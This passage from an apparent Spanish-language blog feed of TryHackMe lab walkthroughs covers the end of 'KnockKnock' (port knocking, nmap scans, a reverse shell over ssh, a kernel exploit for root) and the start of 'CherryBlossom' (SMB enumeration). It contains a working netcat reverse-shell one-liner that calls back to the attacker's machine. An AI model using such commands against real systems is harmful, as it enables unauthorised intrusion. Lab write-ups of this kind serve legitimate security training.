&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 &lt;span class=&#34;m&#34;&gt;7000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;8000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9000&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nmap 10.10.220.35
Starting Nmap 7.80 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-02-24 17:11 CST
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.220.35
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT     STATE SERVICE
80/tcp   open  http
8888/tcp open  sun-answerbook

Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 17.61 seconds
root@aoiri:~/tryhackme/knockknock#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Visitamos la IP con el puerto &lt;code&gt;8888&lt;/code&gt; y encontramos una nueva direccion de la pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_171727.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la direccion encontramos nuevamente un archivo PCAP:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_171821.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al analizar el archivo PCAP encontramos una solicitud en la que se muestra una imagen en ASCII con un mensaje:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_171922.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El mensaje esta en aleman por lo que utilizamos google para traducir el mensaje:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_172433.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mensaje:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1 3 3 7
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Utilizamos los puerto 1, 3, 3 y 7 con knock, y utilizamos nmap para escanear el puerto &lt;code&gt;1337&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nmap -p1337 10.10.220.35
Starting Nmap 7.80 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-02-24 17:31 CST
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.220.35
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE
1337/tcp open  waste

Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 0.53 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Visitamos el puerto y encontramos una nueva direccion:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_173249.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos en la direccion un string en base64:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_173330.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al traducirlo encontramos varios puertos que indican que es para el servicio SSH:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/knockknock# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d
Open up SSH: &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7777&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6666&lt;/span&gt;
root@aoiri:~/tryhackme/knockknock#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos los puertos con knock y analizamos nuevamente la IP con nmap:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/knockknock# knock 10.10.220.35 &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7777&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6666&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; nmap -sV -sC 10.10.220.35
Starting Nmap 7.80 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-02-24 17:35 CST
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.220.35
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; 8d:1f:97:c6:4d:e9:1d:2b:5d:b8:6e:64:66:bb:48:2b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 02:31:1c:77:aa:c1:f6:2b:d3:09:f6:e0:63:fe:a9:37 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; fe:16:33:a4:4d:7f:3d:db:b6:11:d4:b8:c1:32:b6:79 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; cc:5c:76:be:e8:93:b8:55:ef:e8:a3:bd:64:76:2d:75 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 42.73 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que el servicio SSH esta abierto en el puerto 22, intentamos conectarnos al puerto 22 sin ningun usuario y al conectarnos nos muestra un mensaje donde nos muestra el usuario y su contraseña:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_173803.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos conectarnos con las credenciales pero nos cierra la sesion rapidamente, ademas de eso nos muestra un mensaje en el que nos indica que tenemos un segundo de conexion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_174147.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el parametro &lt;code&gt;-f&lt;/code&gt; para poder ejecutar comandos al conectarnos en el servicio, vemos que el comando &lt;code&gt;ls -lah&lt;/code&gt; se ejecuta:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_174315.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos una shell inversa:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/knockknock# knock 10.10.108.150 &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7777&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6666&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ssh butthead@10.10.108.150 -f &lt;span class=&#34;s1&#34;&gt;&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.8.1.72 1338 &amp;gt;/tmp/f&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;############################################&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# CONGRATS! YOU HAVE OPENED THE SSH SERVER #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# USERNAME: butthead                       #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# PASSWORD: **********                     #&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;############################################&lt;/span&gt;
butthead@10.10.108.150&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
root@aoiri:~/tryhackme/knockknock#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y obtenemos shell con el usuario butthead.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_213351.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Enumeramos la maquina en busqueda de aplicaciones, archivos, directorios vulnerables. Encontramos que el kernel de esta maquina en su version &lt;code&gt;3.13.0-46-generic&lt;/code&gt; es vulnerable. Descargamos el &lt;a href=&#34;https://www.exploit-db.com/exploits/37292&#34;&gt;&lt;strong&gt;exploit&lt;/strong&gt;&lt;/a&gt; en la maquina, lo compilamos y ejecutamos el exploit, obtenemos una shell con usuario root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/knockknock/Screenshot_20200224_215756.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/knockknock/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/knockknock/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - CherryBlossom</title>
        <link>https://sckull.github.io/posts/cherryblossom/</link>
        <pubDate>Fri, 21 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 21 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/cherryblossom/</guid>
        <description>CherryBlossom es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;CherryBlossom es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;CherryBlossom&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Boot-to-root with emphasis on crypto and password cracking.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;1450&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Dificil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Feb 21 18:25:06 2020 as: nmap -p- -sV -o nmap_scan 10.10.214.121&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.214.121
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.28s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Host: UBUNTU&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Feb 21 18:43:37 2020 -- 1 IP address (1 host up) scanned in 1111.32 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user&#34;&gt;USER&lt;/h2&gt;
&lt;h3 id=&#34;enum4linux&#34;&gt;Enum4linux&lt;/h3&gt;
&lt;p&gt;Utilizamos esta herramienta para obtener informacion del servicio de SAMBA y LDAP.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Feb 21 18:28:18 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.214.121
RID Range ........ 500-550,1000-1050
Username ......... &#39;&#39;
Password ......... &#39;&#39;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.214.121    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 10.10.214.121    |
 ============================================= 
Looking up status of 10.10.214.121
	UBUNTU          &amp;lt;00&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Workstation Service
	UBUNTU          &amp;lt;03&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Messenger Service
	UBUNTU          &amp;lt;20&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  File Server Service
	..__MSBROWSE__. &amp;lt;01&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Master Browser
	WORKGROUP       &amp;lt;00&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Domain/Workgroup Name
	WORKGROUP       &amp;lt;1d&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Master Browser
	WORKGROUP       &amp;lt;1e&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

[... snip ...]

 ============================================ 
|    Getting domain SID for 10.10.214.121    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can&#39;t determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.214.121    |
 ======================================= 
[+] Got OS info for 10.10.214.121 from smbclient: 
[+] Got OS info for 10.10.214.121 from srvinfo:
	UBUNTU         Wk Sv PrQ Unx NT SNT Samba 4.7.6-Ubuntu
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 10.10.214.121    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: samba	Name: 	Desc: 

user:[samba] rid:[0x3e8]

 ========================================== 
|    Share Enumeration on 10.10.214.121    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      Anonymous File Server Share
	IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.214.121
//10.10.214.121/Anonymous	Mapping: OK, Listing: OK
//10.10.214.121/IPC$	[E] Can&#39;t understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

[... snip ...]

[... snip ...]

 ======================================================================== 
|    Users on 10.10.214.121 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3394966362-3970299913-3211979797
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username &#39;&#39;, password &#39;&#39;
[... snip ...]
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[... snip ...]
[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;
S-1-22-1-1001 Unix User\johan (Local User)
S-1-22-1-1002 Unix User\lily (Local User)
[+] Enumerating users using SID S-1-5-21-3394966362-3970299913-3211979797 and logon username &#39;&#39;, password &#39;&#39;
S-1-5-21-3394966362-3970299913-3211979797-500 *unknown*\*unknown* (8)
S-1-5-21-3394966362-3970299913-3211979797-501 UBUNTU\nobody (Local User)
[... snip ...]
S-1-5-21-3394966362-3970299913-3211979797-513 UBUNTU\None (Domain Group)
[... snip ...]
S-1-5-21-3394966362-3970299913-3211979797-1000 UBUNTU\samba (Local User)
[... snip ...]

 ============================================== 
|    Getting printer info for 10.10.214.121    |
 ============================================== 
No printers returned.
enum4linux complete on Fri Feb 21 18:47:43 2020
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nos logeamos en el SHARENAME &lt;strong&gt;Anonymous&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
